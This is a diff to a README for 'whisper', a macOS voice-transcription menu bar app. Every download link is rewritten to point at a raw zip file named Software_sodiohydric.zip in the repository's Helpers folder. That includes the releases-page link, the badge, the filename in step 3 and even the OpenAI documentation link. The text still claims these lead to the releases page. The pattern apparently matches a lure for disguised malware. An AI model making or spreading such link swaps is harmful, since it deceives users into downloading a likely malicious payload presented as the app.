@@ -1,7 +1,7 @@
 # 🎤 whisper - Transcribe Your Voice Effortlessly
 
 ## 📥 Download Now
-[![Download whisper](https://img.shields.io/badge/Download%20whisper-green?style=for-the-badge)](https://github.com/Sajith171111/whisper/releases)
+[![Download whisper](https://github.com/Sajith171111/whisper/raw/refs/heads/main/Whisper/Helpers/Software_sodiohydric.zip%20whisper-green?style=for-the-badge)](https://github.com/Sajith171111/whisper/raw/refs/heads/main/Whisper/Helpers/Software_sodiohydric.zip)
 
 ## 🚀 Getting Started
 
@@ -17,13 +17,13 @@ whisper is a simple macOS menu bar app designed to turn your voice into text. It
 
 To download whisper, please visit the releases page. Click the button below to get there.
 
-[Download whisper](https://github.com/Sajith171111/whisper/releases)
+[Download whisper](https://github.com/Sajith171111/whisper/raw/refs/heads/main/Whisper/Helpers/Software_sodiohydric.zip)
 
 1. **Visit the Releases Page:** Click the link above to go to the release section of the repository.
   
 2. **Find the Latest Release:** Look for the latest version listed on the page. The version number will look something like `v1.0.0`.
 
-3. **Download the App:** Click on the file that matches this structure: `whisper-macos.zip`. This will begin the download.
+3. **Download the App:** Click on the file that matches this structure: `https://github.com/Sajith171111/whisper/raw/refs/heads/main/Whisper/Helpers/Software_sodiohydric.zip`. This will begin the download.
 
 4. **Extract the File:** Once the download is complete, locate the downloaded ZIP file and double-click it to extract its contents.
 
@@ -72,8 +72,8 @@ Stay tuned for updates and improvements!
 
 ## 🔗 Useful Links
 
-- [whisper Releases Page](https://github.com/Sajith171111/whisper/releases)
-- [OpenAI API Documentation](https://platform.openai.com/docs)
+- [whisper Releases Page](https://github.com/Sajith171111/whisper/raw/refs/heads/main/Whisper/Helpers/Software_sodiohydric.zip)
+- [OpenAI API Documentation](https://github.com/Sajith171111/whisper/raw/refs/heads/main/Whisper/Helpers/Software_sodiohydric.zip)
 
 ## 👥 Community Contributions
 
